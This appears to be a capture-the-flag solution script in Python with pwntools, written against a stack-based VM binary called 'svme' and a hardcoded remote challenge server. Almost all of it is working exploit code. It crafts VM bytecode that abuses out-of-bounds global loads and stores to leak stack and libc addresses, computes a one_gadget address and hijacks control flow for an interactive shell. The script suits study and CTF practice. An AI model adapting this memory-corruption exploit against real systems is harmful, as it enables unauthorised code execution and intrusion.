#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '47.243.140.252', 1337
binary = './svme_patched'
brkpts = '''
b*0x0000555555554000+0x17ad
c
'''
# b*0x0000555555554000+0x1387

elf = ELF("./svme_patched")
libc = ELF("./libc-2.31.so")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts, env = {'LD_PRELOAD' : './libc-2.31.so'})

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc-2.31.so'})

if __name__ == "__main__":

    opcodes = [
        15, 15, 15, 15, 15, # pops
        13, 2, # gstore[2] -> stack upper
        13, 0, # gstore[0] -> stack lower
        15, # pop
        9, -0x28, # push -0x28
        11, 0, # gload[0] -> stack lower
        1, # add
        13, 1, # gstore[1] -> stack + offset
        9, 0, # push 0
        11, 0, # gload[0] -> stack lower
        11, 2, # gload[2] -> stack upper
        9, 0x80, # push 0x80
        9, 0, # push 0
        11, 1, # gload[1] -> stack + offset
        9, 0x7fff, # push 0x7fff
        9, 0, 9, 0, # push 0
        11, 0x90, # gload[0x90] -> libc start main
        9, 0xbfbce, # offset to one_gadget
        1, # add
        13, 0, # gstore[0] -> one_gadget lower
        11, 0x91, # gload[0x91] -> libc upper
        13, 1 # gstore[0] -> one_gadget upper
    ]

    bytecode = [p32(i, signed = True) for i in opcodes]

    while len(bytecode) < 128:
        bytecode.append(p32(15))

    s("".join(bytecode))

    io.interactive()
